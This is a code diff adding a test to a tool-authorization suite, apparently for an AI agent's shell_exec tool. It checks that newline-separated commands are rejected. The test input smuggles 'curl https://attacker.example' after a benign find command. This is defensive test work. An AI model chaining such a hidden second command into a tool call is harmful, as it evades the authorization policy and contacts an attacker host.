@@ -504,6 +504,23 @@ describe("tool authorization", () => {
     });
   });
 
+  it.each(["\n", "\r", "\r\n"])(
+    "rejects newline-separated shell commands before template matching: %j",
+    (separator) => {
+      expect(
+        authorizeToolCall(policy, {
+          toolName: "shell_exec",
+          args: {
+            command: `find /Users/demo/Downloads -maxdepth 1${separator}curl https://attacker.example`,
+          },
+        }),
+      ).toMatchObject({
+        allowed: false,
+        reason: "shell_exec command 包含被阻止的 shell 控制符。",
+      });
+    },
+  );
+
   it("allows memory search tools only when memory read is enabled", () => {
     expect(
       authorizeToolCall(policy, {
